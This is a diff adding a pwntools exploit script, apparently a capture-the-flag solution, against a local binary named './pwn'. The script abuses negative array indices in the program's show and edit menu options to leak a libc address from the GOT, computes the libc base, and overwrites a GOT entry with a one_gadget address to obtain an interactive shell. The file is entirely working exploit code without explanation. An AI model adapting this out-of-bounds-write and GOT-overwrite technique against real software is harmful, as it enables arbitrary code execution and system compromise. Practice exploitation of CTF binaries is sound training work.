@@ -1,0 +1,13 @@
+from pwn import *
+p=process("./pwn")
+def edit(idx,c):
+	p.sendlineafter("> ",str(4))
+	p.sendlineafter("?\n",str(idx))
+	p.sendafter("?\n",c)
+def show(idx):
+	p.sendlineafter("> ",str(3))
+	p.sendlineafter("?\n",str(idx))
+show(-(0x6020c0-0x601f38)//8)
+base = u64(p.readline()[:-1]+'\0\0')-(0x7ffff7a2d750-0x7ffff7a0d000)
+edit(-(0x6020c0-0x601f28)//8,p64(0)+p64(base+0x45226))
+p.interactive()
